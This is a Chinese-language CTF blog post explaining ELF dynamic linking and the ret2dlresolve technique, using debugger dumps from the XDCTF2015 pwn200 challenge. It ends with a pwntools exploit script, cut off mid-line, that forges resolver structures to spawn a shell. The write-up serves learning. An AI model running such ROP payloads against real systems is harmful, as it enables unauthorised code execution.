<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  
  <title>ret2_dl_runtime_resolve | sir</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="长江东去浪回头 伴我春晓铜雀楼一壶醉我一歌喉 君乃浪子不回眸">
<meta name="keywords" content="pwn-栈">
<meta property="og:type" content="article">
<meta property="og:title" content="ret2_dl_runtime_resolve">
<meta property="og:url" content="https://cc-sir.github.io/2019/03/26/ret2_dl_runtime_resolve/index.html">
<meta property="og:site_name" content="sir">
<meta property="og:description" content="长江东去浪回头 伴我春晓铜雀楼一壶醉我一歌喉 君乃浪子不回眸">
<meta property="og:locale" content="default">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20190329223153507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODI3OTkw,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20190329231020839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODI3OTkw,size_16,color_FFFFFF,t_70">
<meta property="og:updated_time" content="2019-03-26T15:33:36.532Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ret2_dl_runtime_resolve">
<meta name="twitter:description" content="长江东去浪回头 伴我春晓铜雀楼一壶醉我一歌喉 君乃浪子不回眸">
<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190329223153507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODI3OTkw,size_16,color_FFFFFF,t_70">
  
    <link rel="alternative" href="/atom.xml" title="sir" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/favicon.png">
  
  
      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
  <script>
      var yiliaConfig = {
          rootUrl: '/',
          fancybox: true,
          animate: true,
          isHome: false,
          isPost: true,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
</head></html>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            
            <img lazy-src="/img/touxiang.png" class="js-avatar">
            
        </a>

        <hgroup>
          <h1 class="header-author"><a href="/" title="Hi Mate">钞sir</a></h1>
        </hgroup>

        
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">博客首页</a></li>
                        
                            <li><a href="/archives">所有文章</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1787684615@qq.com" title="mail">mail</a>
                            
                                <a class="fl github" target="_blank" href="https://github.com/cc-sir" title="github">github</a>
                            
                                <a class="fl QQ" target="_blank" href="tencent://QQInterLive/?Cmd=2&Uin=1787684615" title="QQ">QQ</a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <a href="/tags/Android/" style="font-size: 10px;">-Android</a> <a href="/tags/Windows/" style="font-size: 10px;">-Windows</a> <a href="/tags/pwn-堆/" style="font-size: 10px;">-pwn-堆</a> <a href="/tags/writeup/" style="font-size: 13.33px;">-writeup</a> <a href="/tags/Linux-kernel/" style="font-size: 20px;">Linux-kernel</a> <a href="/tags/pwn-Fmtstr/" style="font-size: 10px;">pwn-Fmtstr</a> <a href="/tags/pwn-堆/" style="font-size: 16.67px;">pwn-堆</a> <a href="/tags/pwn-栈/" style="font-size: 20px;">pwn-栈</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/渗透/" style="font-size: 10px;">渗透</a>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://ThunderJie.github.io/">ThunderJie</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://optimic.github.io/">观樂。</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">我已无力接住你，再也不能抗风雨</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">钞sir</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="/img/touxiang.png" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="Me">钞sir</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">博客首页</a></li>
                
                    <li><a href="/archives">所有文章</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1787684615@qq.com" title="mail">mail</a>
                    
                        <a class="github" target="_blank" href="https://github.com/cc-sir" title="github">github</a>
                    
                        <a class="QQ" target="_blank" href="tencent://QQInterLive/?Cmd=2&Uin=1787684615" title="QQ">QQ</a>
                    
                </div>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap"><article id="post-ret2_dl_runtime_resolve" class="article article-type-post" itemscope="" itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/03/26/ret2_dl_runtime_resolve/" class="article-date">
      <time datetime="2019-03-26T15:33:36.532Z" itemprop="datePublished">2019-03-26</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      ret2_dl_runtime_resolve
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        

        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn-栈/">pwn-栈</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>长江东去浪回头 伴我春晓铜雀楼<br>一壶醉我一歌喉 君乃浪子不回眸<br><a id="more"></a></p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>程序想要调用其他动态链接库的函数，必须要在程序加载的时候动态链接；在一个程序运行过程中，可能很多函数在程序执行完时都不会用到，比如一些错误处理函数或者一些用户很少用到的功能模块；所以ELF采用一种叫做延迟绑定(Lazy Binding)的做法，基本思想就是当函数第一次被用到的时候才进行绑定(符号查找、重定位等)；<br>而在linux 中是利用_dl_runtime_resolve(link_map_obj, reloc_index) 来对动态链接的函数进行重定位的；</p>
<h1 id="ELF关于动态链接的关键section"><a href="#ELF关于动态链接的关键section" class="headerlink" title="ELF关于动态链接的关键section"></a>ELF关于动态链接的关键section</h1><h2 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h2><p>动态节一般保存了ELF文件依赖于哪些动态库,动态符号节信息,动态符号节信息;<br>.dynamic是GOT表的第一项；GOT表的第二项是link_map的地址，第三个是_dl_runtime_resolve函数的地址，第四项开始才是函数的GOT表<br><img src="https://img-blog.csdnimg.cn/20190329223153507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODI3OTkw,size_16,color_FFFFFF,t_70" alt=".dynamic"></p>
<h2 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h2><p>动态链接的 ELF 文件具有专门的动态符号表，其使用的结构就是 Elf32_Sym，但是其存储的节为 .dynsym<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span></span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">//对于导入函数符号而言，它是0x12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//对于导入函数符号而言，其他字段都是0</span></span><br></pre></td></tr></table></figure></p>
<p>.dynsym 是运行时所需的，ELF 文件中 export/import 的符号信息全在这里<br>objdump -s -j .dynsym ./test 查看.dynsym基地址和内容</p>
<h2 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h2><p>此节区包含用于动态链接的字符串，大多数情况下这些字符串代表了与符号表项相关的名称；<br>objdump -s -j .dynstr ./test 查看.dynstr基地址和内容</p>
<h2 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h2><p>这里是重定位表，也是一个结构体数组，每个项对应一个导入函数；<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;   <span class="comment">/*  这个值就是got表的虚拟地址 */</span></span><br><span class="line">  Elf32_Word    r_info;     <span class="comment">/* .dynsym节区符号表索引 */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_SYM(val)((val) &gt;&gt; 8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_TYPE(val)   ((val) &amp; 0xff)</span></span><br></pre></td></tr></table></figure></p>
<p>objdump -s -j .rel.plt ./test 查看.rel.plt基地址和内容</p>
<h1 id="dl-runtime-resolve函数具体运行模式"><a href="#dl-runtime-resolve函数具体运行模式" class="headerlink" title="_dl_runtime_resolve函数具体运行模式"></a>_dl_runtime_resolve函数具体运行模式</h1><p>首先总的来说一下_dl_runtime_resolve函数如何使程序第一次调用一个函数：</p>
<ol>
<li>用link_map访问.dynamic，分别取出.dynstr、 .dynsym、 .rel.plt的地址；</li>
<li>.rel.plt + 参数n,求出当前函数的重定位表项Elf32_Rel的指针，记作rel;</li>
<li>rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym;</li>
<li>.dynstr + sym-&gt;st_name得出符号名字符串指针;</li>
<li>在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表;</li>
<li>最后调用这个函数；</li>
</ol>
<p>现在我们通过一个实例来解释上面的过程：<br>任意打开一个ELF程序，这里我用XDCTF2015的<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2dlresolve/XDCTF-2015/main" target="_blank" rel="noopener">pwn200</a>中的strlen函数为例；<br>在0x8048588下断点;<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x8048579 &lt;main+90&gt;     call   setbuf@plt &lt;0x8048390&gt;</span><br><span class="line"> </span><br><span class="line">   0x804857e &lt;main+95&gt;     add    esp, 0x10</span><br><span class="line">   0x8048581 &lt;main+98&gt;     sub    esp, 0xc</span><br><span class="line">   0x8048584 &lt;main+101&gt;    lea    eax, [ebp - 0x6c]</span><br><span class="line">   0x8048587 &lt;main+104&gt;    push   eax</span><br><span class="line"> ► 0x8048588 &lt;main+105&gt;    call   strlen@plt &lt;0x80483b0&gt;</span><br><span class="line">        s: 0xffffbd8c ◂— <span class="string">'Welcome to XDCTF2015~!\n'</span></span><br><span class="line"> </span><br><span class="line">   0x804858d &lt;main+110&gt;    add    esp, 0x10</span><br><span class="line">   0x8048590 &lt;main+113&gt;    sub    esp, 4</span><br><span class="line">   0x8048593 &lt;main+116&gt;    push   eax</span><br><span class="line">   0x8048594 &lt;main+117&gt;    lea    eax, [ebp - 0x6c]</span><br><span class="line">   0x8048597 &lt;main+120&gt;    push   eax</span><br></pre></td></tr></table></figure></p>
<p>然后si进入call   strlen@plt;<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x80483b0  &lt;strlen@plt&gt;                jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+20] &lt;0x804a014&gt;</span><br><span class="line"> </span><br><span class="line">   0x80483b6  &lt;strlen@plt+6&gt;              push   0x10 //参数n</span><br><span class="line">   0x80483bb  &lt;strlen@plt+11&gt;             jmp    0x8048380</span><br><span class="line">    ↓</span><br><span class="line">   0x8048380                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</span><br><span class="line">   0x8048386                              jmp    dword ptr [0x804a008] &lt;0xf7fead80&gt;</span><br><span class="line">       ↓   </span><br><span class="line">   0xf7fead80 &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">   0xf7fead81 &lt;_dl_runtime_resolve+1&gt;     push   ecx</span><br><span class="line">   0xf7fead82 &lt;_dl_runtime_resolve+2&gt;     push   edx</span><br></pre></td></tr></table></figure></p>
<p>我们看到程序没有直接转到strlen函数，而是跳转到了_dl_runtime_resolve函数；并且push了两个参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push   0x10 //参数n</span><br><span class="line">push   dword ptr [_GLOBAL_OFFSET_TABLE_+4]&lt;0x804a004&gt;</span><br></pre></td></tr></table></figure></p>
<p>刚好是_dl_runtime_resolve(link_map_obj, reloc_index)需要的参数；其中0x804a004就是link_map指针,然后0x10就是reloc_index;</p>
<p>我们来看看如何通过这两个参数找到strlen函数的；<br>首先查看link_map的地址0xf7ffd940：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/wx 0x804a004</span><br><span class="line">0x804a004:	0xf7ffd940</span><br></pre></td></tr></table></figure></p>
<p>然后通过link_map找到.dynamic的地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10wx 0xf7ffd940</span><br><span class="line">0xf7ffd940:	0x00000000	0xf7ffdc2c	0x08049f14	0xf7ffdc30</span><br><span class="line">0xf7ffd950:	0x00000000	0xf7ffd940	0x00000000	0xf7ffdc20</span><br></pre></td></tr></table></figure></p>
<p>其中第三个地址就是.dynamic的地址，即0x08049f14；<br>然后通过.dynamic来找到.dynstr、 .dynsym、 .rel.plt的地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40wx 0x08049f14</span><br><span class="line">0x8049f14:	0x00000001	0x00000001	0x0000000c	0x08048358</span><br><span class="line">0x8049f24:	0x0000000d	0x08048624	0x00000019	0x08049f08</span><br><span class="line">0x8049f34:	0x0000001b	0x00000004	0x0000001a	0x08049f0c</span><br><span class="line">0x8049f44:	0x0000001c	0x00000004	0x6ffffef5	0x080481ac</span><br><span class="line">0x8049f54:	0x00000005	0x08048278	0x00000006	0x080481d8</span><br><span class="line">0x8049f64:	0x0000000a	0x0000006b	0x0000000b	0x00000010</span><br><span class="line">0x8049f74:	0x00000015	0xf7ffd920	0x00000003	0x0804a000</span><br><span class="line">0x8049f84:	0x00000002	0x00000028	0x00000014	0x00000011</span><br><span class="line">0x8049f94:	0x00000017	0x08048330	0x00000011	0x08048318</span><br><span class="line">0x8049fa4:	0x00000012	0x00000018	0x00000013	0x00000008</span><br></pre></td></tr></table></figure></p>
<p>.dynamic的地址加0x44的位置是.dynstr；<br>.dynamic的地址加0x4c的位置是.dynsym；<br>.dynamic的地址加0x84的位置是.rel.plt；</p>
<p>然后用.rel.plt的地址加上参数n,即0x08048330 + 0x10找到函数的重定位表项Elf32_Rel的指针，记作rel；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10wx 0x08048330</span><br><span class="line">0x8048330:	0x0804a00c	0x00000107	0x0804a010	0x00000207</span><br><span class="line">0x8048340:	0x0804a014	0x00000407	0x0804a018	0x00000507</span><br><span class="line">0x8048350:	0x0804a01c	0x00000607</span><br></pre></td></tr></table></figure></p>
<p>这里rel为0x8048340，所以：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r_offset = 0x0804a014   //指向GOT表的指针</span><br><span class="line">r_info = 0x00000407</span><br></pre></td></tr></table></figure></p>
<p>然后我们将r_info&gt;&gt;8,即0x00000407&gt;&gt;8 = 4作为.dynsym中的下标；<br>此时我们来到.dynsym的位置，去找找strlen函数的名字符串偏移；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20wx 0x080481d8</span><br><span class="line">0x80481d8:	0x00000000	0x00000000	0x00000000	0x00000000 //dynsym[0]</span><br><span class="line">0x80481e8:	0x00000033	0x00000000	0x00000000	0x00000012 //dynsym[1]</span><br><span class="line">0x80481f8:	0x00000027	0x00000000	0x00000000	0x00000012 //dynsym[2]</span><br><span class="line">0x8048208:	0x00000052	0x00000000	0x00000000	0x00000020 //dynsym[3]</span><br><span class="line">0x8048218:	0x00000020	0x00000000	0x00000000	0x00000012 //dynsym[4]</span><br></pre></td></tr></table></figure></p>
<p>注意是下标，不是相对与.dynsym地址的偏移，如果是找地址偏移需要下标*0x10；<br>所以这里的name_offset = 0x00000020;<br>然后用.dynstr的地址加上name_offset，就是这个函数的符号名字符串st_name；<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/s 0x08048278 + 0x20</span><br><span class="line">0x8048298:	<span class="string">"strlen"</span></span><br></pre></td></tr></table></figure></p>
<p>最后在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表就可以了；</p>
<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>事实上，虚拟地址是通过最后一个箭头，即从st_name得来的，只要我们能够修改这个st_name就可以执行任意函数。比如把st_name的内容修改成为”system”；<br>而index_arg即参数n是我们可以控制的，我们需要做的是通过一系列操作。把index_arg可控转化为st_name可控;我们需要在一个可写地址上构造一系列伪结构就可以完成利用或在条件允许的情况下直接修改.dynstr;<br>所以我们需要在程序中找一段空间出来，放我们直接构造的fake_dynsym,fake_dynstr和fake_rel_plt等；</p>
<h2 id="计算index-arg"><a href="#计算index-arg" class="headerlink" title="计算index_arg"></a>计算index_arg</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -s -j .rel.plt ./<span class="built_in">test</span></span><br><span class="line">./x86: file format elf32-i386</span><br><span class="line">Contents of section .rel.plt:</span><br><span class="line"> 08048298 0ca00408 07010000 10a00408 07030000  ................</span><br><span class="line"> </span><br><span class="line">index_arg = fake_rel_plt_addr - 0x08048298</span><br></pre></td></tr></table></figure>
<h2 id="r-info的计算方法"><a href="#r-info的计算方法" class="headerlink" title="r_info的计算方法"></a>r_info的计算方法</h2><p>r_info的计算方法是：</p>
<ol>
<li>n = (欲伪造的地址-.dynsym基地址)/0x10</li>
<li>r_info = n&lt;&lt;8</li>
</ol>
<p>比如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -s -j .dynsym ./<span class="built_in">test</span></span><br><span class="line">./<span class="built_in">test</span>: file format elf32-i386</span><br><span class="line">Contents of section .dynsym:</span><br><span class="line"> 80481cc 00000000 00000000 00000000 00000000  ................</span><br><span class="line"></span><br><span class="line">x = ((0x0804A040 + 4*4) - 0x080481cc)/0x10</span><br><span class="line">r_info = x&lt;&lt;8 = 0x1e800</span><br><span class="line">还需要过<span class="comment">#define ELF32_R_TYPE(val)   ((val) &amp; 0xff)宏定义，ELF32_R_TYPE(r_info)=7，因此</span></span><br><span class="line">r_info = 0x1e800 + 0x7 = 0x1e807</span><br></pre></td></tr></table></figure></p>
<h2 id="计算name-offset"><a href="#计算name-offset" class="headerlink" title="计算name_offset"></a>计算name_offset</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$objdump</span> -s -j .dynstr ./<span class="built_in">test</span></span><br><span class="line">./<span class="built_in">test</span>: file format elf32-i386</span><br><span class="line">Contents of section .dynstr:</span><br><span class="line"> 804821c 006c6962 632e736f 2e36005f 494f5f73  .libc.so.6._IO_s</span><br><span class="line"></span><br><span class="line">st_name = fake_dynstr_addr - 0x804821c</span><br></pre></td></tr></table></figure>
<p>构造的ROP:<br><img src="https://img-blog.csdnimg.cn/20190329231020839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODI3OTkw,size_16,color_FFFFFF,t_70" alt="构造的ROP"></p>
<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line">name = <span class="string">'./main'</span></span><br><span class="line">p = process(name)</span><br><span class="line"><span class="comment">#p=remote('chall.pwnable.tw', 10103)</span></span><br><span class="line">elf= ELF(name)</span><br><span class="line"><span class="comment">#libc = ELF('./libc_32.so.6')</span></span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    </span><br><span class="line">rel_plt_addr = elf.get_section_by_name(<span class="string">'.rel.plt'</span>).header.sh_addr   <span class="comment">#0x8048330</span></span><br><span class="line">dynsym_addr =  elf.get_section_by_name(<span class="string">'.dynsym'</span>).header.sh_addr    <span class="comment">#0x80481d8</span></span><br><span class="line">dynstr_addr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).header.sh_addr     <span class="comment">#0x8048278</span></span><br><span class="line">resolve_plt = <span class="number">0x08048380</span></span><br><span class="line">leave_ret_addr = <span class="number">0x0804851D</span></span><br><span class="line">start = <span class="number">0x804aa00</span></span><br><span class="line"></span><br><span class="line">fake_rel_plt_addr = start</span><br><span class="line">fake_dynsym_addr = fake_rel_plt_addr + <span class="number">0x8</span></span><br><span class="line">fake_dynstr_addr = fake_dynsym_addr + <span class="number">0x10</span></span><br><span class="line">bin_sh_addr = fake_dynstr_addr + <span class="number">0x7</span></span><br><span class="line"></span><br><span class="line">n = fake_rel_plt_addr - rel_plt_addr</span><br><span class="line">r_info = (((fake_dynsym_addr - dynsym_addr)/<span class="number">0x10</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br><span class="line">str_offset = fake_dynstr_addr - dynstr_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_rel_plt = p32(elf.got[<span class="string">'read'</span>]) + p32(r_info)</span><br><span class="line">fake_dynsym = p32(str_offset) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12000000</span>)</span><br><span class="line">fake_dynstr = <span class="string">"system\x00/bin/sh\x00\x00"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay1 = <span class="string">'a'</span>*<span class="number">108</span> + p32(start - <span class="number">20</span>) + p32(elf.plt[<span class="string">'read'</span>]) + p32(leave_ret_addr) + p32(<span class="number">0</span>) + p32(start - <span class="number">20</span>) + p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line">p.sendline(pay1)</span><br><span class="line"></span><br><span class="line">pay2 = p32(<span class="number">0x0</span>) + p32(resolve_plt) + p32(n) + <span class="string">'aaaa'</span> + p32(bin_sh_addr) + fake_rel_plt + fake_dynsym + fake_dynstr</span><br><span class="line"></span><br><span class="line">p.sendline(pay2)</span><br><span class="line"></span><br><span class="line">success(<span class="string">".rel_plt: "</span> + hex(rel_plt_addr))</span><br><span class="line">success(<span class="string">".dynsym: "</span> + hex(dynsym_addr))</span><br><span class="line">success(<span class="string">".dynstr: "</span> + hex(dynstr_addr))</span><br><span class="line">success(<span class="string">"fake_rel_plt_addr: "</span> + hex(fake_rel_plt_addr))</span><br><span class="line">success(<span class="string">"fake_dynsym_addr: "</span> + hex(fake_dynsym_addr))</span><br><span class="line">success(<span class="string">"fake_dynstr_addr: "</span> + hex(fake_dynstr_addr))</span><br><span class="line">success(<span 